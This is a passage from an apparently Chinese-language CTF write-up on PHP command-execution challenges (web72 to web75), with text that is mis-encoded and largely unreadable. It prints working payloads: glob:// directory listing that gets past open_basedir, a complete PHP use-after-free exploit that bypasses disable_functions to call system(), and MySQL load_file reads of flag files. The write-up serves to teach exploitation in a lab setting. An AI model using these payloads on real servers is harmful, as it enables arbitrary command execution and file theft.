</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="err">   echo($f-&gt;__toString().&#39; &#39;);// è¾“å‡ºæ¡ç›®çš„åç§°ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªç©ºæ ¼
</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="err">}
</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="err">exit(0); // ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ
</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p><img alt="image-20241129151607469" loading="lazy" src="../assets/image-20241129151607469.png"></p>
<p>æˆ–è€…</p>
<p>payloadï¼šï¼ˆè®°å¾—åˆ æ³¨é‡Šï¼‰</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="cp">?&gt;</span><span class="err">&lt;?php $a = opendir(&#34;glob:///*&#34;); // æ‰“å¼€æ ¹ç›®å½•ï¼Œå¹¶å°†ç›®å½•å¥æŸ„èµ‹å€¼ç»™$a
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="err">while (($file = readdir($a)) !== false) { // å¾ªç¯è¯»å–ç›®å½•ä¸­çš„æ¯ä¸ªæ¡ç›®
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="err">    echo $file . &#34;&lt;br&gt;&#34;; // è¾“å‡ºæ¯ä¸ªæ¡ç›®çš„åç§°ï¼Œå¹¶æ·»åŠ HTMLæ¢è¡Œæ ‡ç­¾
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="err">};
</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="err">exit(0); // ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ
</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p>æˆ‘ä»¬å¯ä»¥å‘ç°flag0.php</p>
<p>åˆ©ç”¨uafçš„è„šæœ¬è¿›è¡Œå‘½ä»¤åˆ©ç”¨uafçš„è„šæœ¬è¿›è¡Œå‘½ä»¤æ‰§è¡Œæ‰§è¡Œï¼š</p>
<p>å°è¯•æ‰§è¡Œls /; cat /flag0.txtå‘½ä»¤</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">  1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="cp">?&gt;</span><span class="err">&lt;?php
</span></span></span><span class="line"><span class="ln">  2</span><span class="cl"><span class="err">pwn(&#34;ls /;cat /flag0.txt&#34;);
</span></span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">  4</span><span class="cl"><span class="err">function pwn($cmd) {
</span></span></span><span class="line"><span class="ln">  5</span><span class="cl"><span class="err">    global $abc, $helper, $backtrace;
</span></span></span><span class="line"><span class="ln">  6</span><span class="cl"><span class="err">    class Vuln {
</span></span></span><span class="line"><span class="ln">  7</span><span class="cl"><span class="err">        public $a;
</span></span></span><span class="line"><span class="ln">  8</span><span class="cl"><span class="err">        public function __destruct() { 
</span></span></span><span class="line"><span class="ln">  9</span><span class="cl"><span class="err">            global $backtrace; 
</span></span></span><span class="line"><span class="ln"> 10</span><span class="cl"><span class="err">            unset($this-&gt;a);
</span></span></span><span class="line"><span class="ln"> 11</span><span class="cl"><span class="err">            $backtrace = (new Exception)-&gt;getTrace(); # ;)
</span></span></span><span class="line"><span class="ln"> 12</span><span class="cl"><span class="err">            if(!isset($backtrace[1][&#39;args&#39;])) { # PHP &gt;= 7.4
</span></span></span><span class="line"><span class="ln"> 13</span><span class="cl"><span class="err">                $backtrace = debug_backtrace();
</span></span></span><span class="line"><span class="ln"> 14</span><span class="cl"><span class="err">            }
</span></span></span><span class="line"><span class="ln"> 15</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 16</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 17</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 18</span><span class="cl"><span class="err">    class Helper {
</span></span></span><span class="line"><span class="ln"> 19</span><span class="cl"><span class="err">        public $a, $b, $c, $d;
</span></span></span><span class="line"><span class="ln"> 20</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 21</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 22</span><span class="cl"><span class="err">    function str2ptr(&amp;$str, $p = 0, $s = 8) {
</span></span></span><span class="line"><span class="ln"> 23</span><span class="cl"><span class="err">        $address = 0;
</span></span></span><span class="line"><span class="ln"> 24</span><span class="cl"><span class="err">        for($j = $s-1; $j &gt;= 0; $j--) {
</span></span></span><span class="line"><span class="ln"> 25</span><span class="cl"><span class="err">            $address &lt;&lt;= 8;
</span></span></span><span class="line"><span class="ln"> 26</span><span class="cl"><span class="err">            $address |= ord($str[$p+$j]);
</span></span></span><span class="line"><span class="ln"> 27</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 28</span><span class="cl"><span class="err">        return $address;
</span></span></span><span class="line"><span class="ln"> 29</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 30</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 31</span><span class="cl"><span class="err">    function ptr2str($ptr, $m = 8) {
</span></span></span><span class="line"><span class="ln"> 32</span><span class="cl"><span class="err">        $out = &#34;&#34;;
</span></span></span><span class="line"><span class="ln"> 33</span><span class="cl"><span class="err">        for ($i=0; $i &lt; $m; $i++) {
</span></span></span><span class="line"><span class="ln"> 34</span><span class="cl"><span class="err">            $out .= sprintf(&#39;%c&#39;,$ptr &amp; 0xff);
</span></span></span><span class="line"><span class="ln"> 35</span><span class="cl"><span class="err">            $ptr &gt;&gt;= 8;
</span></span></span><span class="line"><span class="ln"> 36</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 37</span><span class="cl"><span class="err">        return $out;
</span></span></span><span class="line"><span class="ln"> 38</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 39</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 40</span><span class="cl"><span class="err">    function write(&amp;$str, $p, $v, $n = 8) {
</span></span></span><span class="line"><span class="ln"> 41</span><span class="cl"><span class="err">        $i = 0;
</span></span></span><span class="line"><span class="ln"> 42</span><span class="cl"><span class="err">        for($i = 0; $i &lt; $n; $i++) {
</span></span></span><span class="line"><span class="ln"> 43</span><span class="cl"><span class="err">            $str[$p + $i] = sprintf(&#39;%c&#39;,$v &amp; 0xff);
</span></span></span><span class="line"><span class="ln"> 44</span><span class="cl"><span class="err">            $v &gt;&gt;= 8;
</span></span></span><span class="line"><span class="ln"> 45</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 46</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 47</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 48</span><span class="cl"><span class="err">    function leak($addr, $p = 0, $s = 8) {
</span></span></span><span class="line"><span class="ln"> 49</span><span class="cl"><span class="err">        global $abc, $helper;
</span></span></span><span class="line"><span class="ln"> 50</span><span class="cl"><span class="err">        write($abc, 0x68, $addr + $p - 0x10);
</span></span></span><span class="line"><span class="ln"> 51</span><span class="cl"><span class="err">        $leak = strlen($helper-&gt;a);
</span></span></span><span class="line"><span class="ln"> 52</span><span class="cl"><span class="err">        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }
</span></span></span><span class="line"><span class="ln"> 53</span><span class="cl"><span class="err">        return $leak;
</span></span></span><span class="line"><span class="ln"> 54</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 55</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 56</span><span class="cl"><span class="err">    function parse_elf($base) {
</span></span></span><span class="line"><span class="ln"> 57</span><span class="cl"><span class="err">        $e_type = leak($base, 0x10, 2);
</span></span></span><span class="line"><span class="ln"> 58</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 59</span><span class="cl"><span class="err">        $e_phoff = leak($base, 0x20);
</span></span></span><span class="line"><span class="ln"> 60</span><span class="cl"><span class="err">        $e_phentsize = leak($base, 0x36, 2);
</span></span></span><span class="line"><span class="ln"> 61</span><span class="cl"><span class="err">        $e_phnum = leak($base, 0x38, 2);
</span></span></span><span class="line"><span class="ln"> 62</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 63</span><span class="cl"><span class="err">        for($i = 0; $i &lt; $e_phnum; $i++) {
</span></span></span><span class="line"><span class="ln"> 64</span><span class="cl"><span class="err">            $header = $base + $e_phoff + $i * $e_phentsize;
</span></span></span><span class="line"><span class="ln"> 65</span><span class="cl"><span class="err">            $p_type  = leak($header, 0, 4);
</span></span></span><span class="line"><span class="ln"> 66</span><span class="cl"><span class="err">            $p_flags = leak($header, 4, 4);
</span></span></span><span class="line"><span class="ln"> 67</span><span class="cl"><span class="err">            $p_vaddr = leak($header, 0x10);
</span></span></span><span class="line"><span class="ln"> 68</span><span class="cl"><span class="err">            $p_memsz = leak($header, 0x28);
</span></span></span><span class="line"><span class="ln"> 69</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 70</span><span class="cl"><span class="err">            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write
</span></span></span><span class="line"><span class="ln"> 71</span><span class="cl"><span class="err">                # handle pie
</span></span></span><span class="line"><span class="ln"> 72</span><span class="cl"><span class="err">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
</span></span></span><span class="line"><span class="ln"> 73</span><span class="cl"><span class="err">                $data_size = $p_memsz;
</span></span></span><span class="line"><span class="ln"> 74</span><span class="cl"><span class="err">            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec
</span></span></span><span class="line"><span class="ln"> 75</span><span class="cl"><span class="err">                $text_size = $p_memsz;
</span></span></span><span class="line"><span class="ln"> 76</span><span class="cl"><span class="err">            }
</span></span></span><span class="line"><span class="ln"> 77</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 78</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 79</span><span class="cl"><span class="err">        if(!$data_addr || !$text_size || !$data_size)
</span></span></span><span class="line"><span class="ln"> 80</span><span class="cl"><span class="err">            return false;
</span></span></span><span class="line"><span class="ln"> 81</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 82</span><span class="cl"><span class="err">        return [$data_addr, $text_size, $data_size];
</span></span></span><span class="line"><span class="ln"> 83</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 84</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 85</span><span class="cl"><span class="err">    function get_basic_funcs($base, $elf) {
</span></span></span><span class="line"><span class="ln"> 86</span><span class="cl"><span class="err">        list($data_addr, $text_size, $data_size) = $elf;
</span></span></span><span class="line"><span class="ln"> 87</span><span class="cl"><span class="err">        for($i = 0; $i &lt; $data_size / 8; $i++) {
</span></span></span><span class="line"><span class="ln"> 88</span><span class="cl"><span class="err">            $leak = leak($data_addr, $i * 8);
</span></span></span><span class="line"><span class="ln"> 89</span><span class="cl"><span class="err">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
</span></span></span><span class="line"><span class="ln"> 90</span><span class="cl"><span class="err">                $deref = leak($leak);
</span></span></span><span class="line"><span class="ln"> 91</span><span class="cl"><span class="err">                # &#39;constant&#39; constant check
</span></span></span><span class="line"><span class="ln"> 92</span><span class="cl"><span class="err">                if($deref != 0x746e6174736e6f63)
</span></span></span><span class="line"><span class="ln"> 93</span><span class="cl"><span class="err">                    continue;
</span></span></span><span class="line"><span class="ln"> 94</span><span class="cl"><span class="err">            } else continue;
</span></span></span><span class="line"><span class="ln"> 95</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 96</span><span class="cl"><span class="err">            $leak = leak($data_addr, ($i + 4) * 8);
</span></span></span><span class="line"><span class="ln"> 97</span><span class="cl"><span class="err">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
</span></span></span><span class="line"><span class="ln"> 98</span><span class="cl"><span class="err">                $deref = leak($leak);
</span></span></span><span class="line"><span class="ln"> 99</span><span class="cl"><span class="err">                # &#39;bin2hex&#39; constant check
</span></span></span><span class="line"><span class="ln">100</span><span class="cl"><span class="err">                if($deref != 0x786568326e6962)
</span></span></span><span class="line"><span class="ln">101</span><span class="cl"><span class="err">                    continue;
</span></span></span><span class="line"><span class="ln">102</span><span class="cl"><span class="err">            } else continue;
</span></span></span><span class="line"><span class="ln">103</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">104</span><span class="cl"><span class="err">            return $data_addr + $i * 8;
</span></span></span><span class="line"><span class="ln">105</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln">106</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">107</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">108</span><span class="cl"><span class="err">    function get_binary_base($binary_leak) {
</span></span></span><span class="line"><span class="ln">109</span><span class="cl"><span class="err">        $base = 0;
</span></span></span><span class="line"><span class="ln">110</span><span class="cl"><span class="err">        $start = $binary_leak &amp; 0xfffffffffffff000;
</span></span></span><span class="line"><span class="ln">111</span><span class="cl"><span class="err">        for($i = 0; $i &lt; 0x1000; $i++) {
</span></span></span><span class="line"><span class="ln">112</span><span class="cl"><span class="err">            $addr = $start - 0x1000 * $i;
</span></span></span><span class="line"><span class="ln">113</span><span class="cl"><span class="err">            $leak = leak($addr, 0, 7);
</span></span></span><span class="line"><span class="ln">114</span><span class="cl"><span class="err">            if($leak == 0x10102464c457f) { # ELF header
</span></span></span><span class="line"><span class="ln">115</span><span class="cl"><span class="err">                return $addr;
</span></span></span><span class="line"><span class="ln">116</span><span class="cl"><span class="err">            }
</span></span></span><span class="line"><span class="ln">117</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln">118</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">119</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">120</span><span class="cl"><span class="err">    function get_system($basic_funcs) {
</span></span></span><span class="line"><span class="ln">121</span><span class="cl"><span class="err">        $addr = $basic_funcs;
</span></span></span><span class="line"><span class="ln">122</span><span class="cl"><span class="err">        do {
</span></span></span><span class="line"><span class="ln">123</span><span class="cl"><span class="err">            $f_entry = leak($addr);
</span></span></span><span class="line"><span class="ln">124</span><span class="cl"><span class="err">            $f_name = leak($f_entry, 0, 6);
</span></span></span><span class="line"><span class="ln">125</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">126</span><span class="cl"><span class="err">            if($f_name == 0x6d6574737973) { # system
</span></span></span><span class="line"><span class="ln">127</span><span class="cl"><span class="err">                return leak($addr + 8);
</span></span></span><span class="line"><span class="ln">128</span><span class="cl"><span class="err">            }
</span></span></span><span class="line"><span class="ln">129</span><span class="cl"><span class="err">            $addr += 0x20;
</span></span></span><span class="line"><span class="ln">130</span><span class="cl"><span class="err">        } while($f_entry != 0);
</span></span></span><span class="line"><span class="ln">131</span><span class="cl"><span class="err">        return false;
</span></span></span><span class="line"><span class="ln">132</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">133</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">134</span><span class="cl"><span class="err">    function trigger_uaf($arg) {
</span></span></span><span class="line"><span class="ln">135</span><span class="cl"><span class="err">        # str_shuffle prevents opcache string interning
</span></span></span><span class="line"><span class="ln">136</span><span class="cl"><span class="err">        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
</span></span></span><span class="line"><span class="ln">137</span><span class="cl"><span class="err">        $vuln = new Vuln();
</span></span></span><span class="line"><span class="ln">138</span><span class="cl"><span class="err">        $vuln-&gt;a = $arg;
</span></span></span><span class="line"><span class="ln">139</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">140</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">141</span><span class="cl"><span class="err">    if(stristr(PHP_OS, &#39;WIN&#39;)) {
</span></span></span><span class="line"><span class="ln">142</span><span class="cl"><span class="err">        die(&#39;This PoC is for *nix systems only.&#39;);
</span></span></span><span class="line"><span class="ln">143</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">144</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">145</span><span class="cl"><span class="err">    $n_alloc = 10; # increase this value if UAF fails
</span></span></span><span class="line"><span class="ln">146</span><span class="cl"><span class="err">    $contiguous = [];
</span></span></span><span class="line"><span class="ln">147</span><span class="cl"><span class="err">    for($i = 0; $i &lt; $n_alloc; $i++)
</span></span></span><span class="line"><span class="ln">148</span><span class="cl"><span class="err">        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
</span></span></span><span class="line"><span class="ln">149</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">150</span><span class="cl"><span class="err">    trigger_uaf(&#39;x&#39;);
</span></span></span><span class="line"><span class="ln">151</span><span class="cl"><span class="err">    $abc = $backtrace[1][&#39;args&#39;][0];
</span></span></span><span class="line"><span class="ln">152</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">153</span><span class="cl"><span class="err">    $helper = new Helper;
</span></span></span><span class="line"><span class="ln">154</span><span class="cl"><span class="err">    $helper-&gt;b = function ($x) { };
</span></span></span><span class="line"><span class="ln">155</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">156</span><span class="cl"><span class="err">    if(strlen($abc) == 79 || strlen($abc) == 0) {
</span></span></span><span class="line"><span class="ln">157</span><span class="cl"><span class="err">        die(&#34;UAF failed&#34;);
</span></span></span><span class="line"><span class="ln">158</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">159</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">160</span><span class="cl"><span class="err">    # leaks
</span></span></span><span class="line"><span class="ln">161</span><span class="cl"><span class="err">    $closure_handlers = str2ptr($abc, 0);
</span></span></span><span class="line"><span class="ln">162</span><span class="cl"><span class="err">    $php_heap = str2ptr($abc, 0x58);
</span></span></span><span class="line"><span class="ln">163</span><span class="cl"><span class="err">    $abc_addr = $php_heap - 0xc8;
</span></span></span><span class="line"><span class="ln">164</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">165</span><span class="cl"><span class="err">    # fake value
</span></span></span><span class="line"><span class="ln">166</span><span class="cl"><span class="err">    write($abc, 0x60, 2);
</span></span></span><span class="line"><span class="ln">167</span><span class="cl"><span class="err">    write($abc, 0x70, 6);
</span></span></span><span class="line"><span class="ln">168</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">169</span><span class="cl"><span class="err">    # fake reference
</span></span></span><span class="line"><span class="ln">170</span><span class="cl"><span class="err">    write($abc, 0x10, $abc_addr + 0x60);
</span></span></span><span class="line"><span class="ln">171</span><span class="cl"><span class="err">    write($abc, 0x18, 0xa);
</span></span></span><span class="line"><span class="ln">172</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">173</span><span class="cl"><span class="err">    $closure_obj = str2ptr($abc, 0x20);
</span></span></span><span class="line"><span class="ln">174</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">175</span><span class="cl"><span class="err">    $binary_leak = leak($closure_handlers, 8);
</span></span></span><span class="line"><span class="ln">176</span><span class="cl"><span class="err">    if(!($base = get_binary_base($binary_leak))) {
</span></span></span><span class="line"><span class="ln">177</span><span class="cl"><span class="err">        die(&#34;Couldn&#39;t determine binary base address&#34;);
</span></span></span><span class="line"><span class="ln">178</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">179</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">180</span><span class="cl"><span class="err">    if(!($elf = parse_elf($base))) {
</span></span></span><span class="line"><span class="ln">181</span><span class="cl"><span class="err">        die(&#34;Couldn&#39;t parse ELF header&#34;);
</span></span></span><span class="line"><span class="ln">182</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">183</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">184</span><span class="cl"><span class="err">    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
</span></span></span><span class="line"><span class="ln">185</span><span class="cl"><span class="err">        die(&#34;Couldn&#39;t get basic_functions address&#34;);
</span></span></span><span class="line"><span class="ln">186</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">187</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">188</span><span class="cl"><span class="err">    if(!($zif_system = get_system($basic_funcs))) {
</span></span></span><span class="line"><span class="ln">189</span><span class="cl"><span class="err">        die(&#34;Couldn&#39;t get zif_system address&#34;);
</span></span></span><span class="line"><span class="ln">190</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">191</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">192</span><span class="cl"><span class="err">    # fake closure object
</span></span></span><span class="line"><span class="ln">193</span><span class="cl"><span class="err">    $fake_obj_offset = 0xd0;
</span></span></span><span class="line"><span class="ln">194</span><span class="cl"><span class="err">    for($i = 0; $i &lt; 0x110; $i += 8) {
</span></span></span><span class="line"><span class="ln">195</span><span class="cl"><span class="err">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
</span></span></span><span class="line"><span class="ln">196</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">197</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">198</span><span class="cl"><span class="err">    # pwn
</span></span></span><span class="line"><span class="ln">199</span><span class="cl"><span class="err">    write($abc, 0x20, $abc_addr + $fake_obj_offset);
</span></span></span><span class="line"><span class="ln">200</span><span class="cl"><span class="err">    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
</span></span></span><span class="line"><span class="ln">201</span><span class="cl"><span class="err">    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
</span></span></span><span class="line"><span class="ln">202</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">203</span><span class="cl"><span class="err">    ($helper-&gt;b)($cmd);
</span></span></span><span class="line"><span class="ln">204</span><span class="cl"><span class="err">    exit();
</span></span></span><span class="line"><span class="ln">205</span><span class="cl"><span class="err">}
</span></span></span><span class="line"><span class="ln">206</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p>è®°å¾—è¦è½¬url</p>
<p><img alt="image-20241129232845637" loading="lazy" src="../assets/image-20241129232845637.png"></p>
<h5 id="æ‰€ä»¥ä»€ä¹ˆæ˜¯uafå‘¢">æ‰€ä»¥ä»€ä¹ˆæ˜¯uafå‘¢ï¼Ÿ<a hidden class="anchor" aria-hidden="true" href="#æ‰€ä»¥ä»€ä¹ˆæ˜¯uafå‘¢">#</a></h5>
<p>ï¼ˆå…ˆæŒ–ä¸ªå‘å›å¤´è¡¥ï¼‰</p>
<h4 id="web73">web73<a hidden class="anchor" aria-hidden="true" href="#web73">#</a></h4>
<p>è¿™ä¸€é¢˜å’Œä¸Šä¸€é¢˜çš„åŒºåˆ«å…¶å®å°±æ˜¯flagçš„æ–‡ä»¶æ”¹åäº†ï¼Œæˆ‘ä»¬ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•è¯»ä¸€ä¸‹æ–‡ä»¶</p>
<pre tabindex="0"><code>c=?&gt;&lt;?php $a=new DirectoryIterator(&#34;glob:///*&#34;);// åˆ›å»ºä¸€ä¸ªDirectoryIteratorå¯¹è±¡ï¼Œéå†æ ¹ç›®å½•
foreach($a as $f)// éå†æ¯ä¸ªæ¡ç›®
{
   echo($f-&gt;__toString().&#39; &#39;);// è¾“å‡ºæ¡ç›®çš„åç§°ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªç©ºæ ¼
}
exit(0); // ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ
?&gt;
</code></pre><p><img alt="image-20241129234701193" loading="lazy" src="../assets/image-20241129234701193.png"></p>
<p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªflagc.txtæ–‡ä»¶</p>
<p>è¿™é¢˜å…¶å®å·²ç»å…³é—­äº†open_basedirï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ä¹‹å‰çš„æ–¹æ³•è¯»</p>
<pre tabindex="0"><code>var_export(scandir(&#39;/&#39;));exit();
</code></pre><pre tabindex="0"><code>echo(implode(&#39; &#39;,scandir(&#39;/&#39;)));exit();
</code></pre><p>è¯»æ–‡ä»¶çš„è¯ä¸Šä¸€é¢˜çš„uafæ–¹æ³•è¢«banäº†ï¼Œè¿™é¢˜ç”¨ä¸äº†</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯ç”¨ä¹‹å‰æ–¹æ³•</p>
<pre tabindex="0"><code>c=readgzfile(&#39;/flagc.txt&#39;);exit();
</code></pre><p><img alt="image-20241129235458680" loading="lazy" src="../assets/image-20241129235458680.png"></p>
<h4 id="web74">web74<a hidden class="anchor" aria-hidden="true" href="#web74">#</a></h4>
<p><img alt="image-20241129235835167" loading="lazy" src="../assets/image-20241129235835167.png"></p>
<p>è¿™é¢˜æˆ‘å…ˆç”¨ä¹‹å‰çš„æ–¹æ³•var_exportè¯•è¯•èƒ½ä¸èƒ½è¯»åˆ°ç›®å½•ï¼Œå‘ç°æ˜¾ç¤ºnullï¼Œåº”è¯¥æ˜¯open_basediræ‰“å¼€äº†</p>
<p><img alt="image-20241130000019913" loading="lazy" src="../assets/image-20241130000019913.png"></p>
<p>æ¥ç€ç”¨globåè®®çš„æ–¹æ³•è¯»åˆ°äº†ï¼Œflagæ–‡ä»¶åå«åšflagx.txt</p>
<p>å…ˆç”¨uafçš„æ–¹æ³•è¯•è¯•</p>
<p><img alt="image-20241130000253395" loading="lazy" src="../assets/image-20241130000253395.png"></p>
<p>å‘ç°è¿™æ¡è·¯è¢«banæ‰äº†</p>
<p><img alt="image-20241130000438521" loading="lazy" src="../assets/image-20241130000438521.png"></p>
<p>æœ€åç”¨</p>
<pre tabindex="0"><code>c=readgzfile(&#39;/flagx.txt&#39;);exit();
</code></pre><p>æˆåŠŸæŸ¥åˆ°äº†flag</p>
<h4 id="web75">web75<a hidden class="anchor" aria-hidden="true" href="#web75">#</a></h4>
<p><img alt="image-20241130001438365" loading="lazy" src="../assets/image-20241130001438365.png"></p>
<p>è¿™é¢˜è¦ç”¨globæŸ¥æ–‡ä»¶ï¼Œç”¨var_exportæŸ¥ä¸äº†</p>
<p>æ¥ä¸‹æ¥æ˜¯è¯»æ–‡ä»¶</p>
<p>å°è¯•äº†uafå’Œreadgzfileä¹‹ç±»çš„æ–¹æ³•éƒ½å¤±è´¥äº†</p>
<p>æ²¡åŠæ³•çœ‹çœ‹å¤§ä½¬æ€ä¹ˆåšçš„</p>
<p>æˆ‘ä»¬å…¶å®å¯ä»¥ç”¨åˆ°mysqlçš„load_fileæ–¹æ³•ï¼Œä»è€Œè¯»åˆ°flag</p>
<p>payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="nv">$conn</span> <span class="o">=</span> <span class="nx">mysqli_connect</span><span class="p">(</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span> <span class="s2">&#34;ctftraining&#34;</span><span class="p">);</span> <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select load_file(&#39;/flag36.txt&#39;) as a&#34;</span><span class="p">;</span> <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span> <span class="k">while</span><span class="p">(</span><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$row</span><span class="p">)){</span> <span class="k">echo</span> <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span> <span class="p">}</span> <span class="k">exit</span><span class="p">();</span>
</span></span></code></pre></div><p>è±†åŒ…è§£é‡Šä¸€ä¸‹</p>
<blockquote>
<ol>
<li>æ•°æ®åº“è¿æ¥ï¼š
<ul>
<li><code>$conn = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;ctftraining&quot;);</code></li>
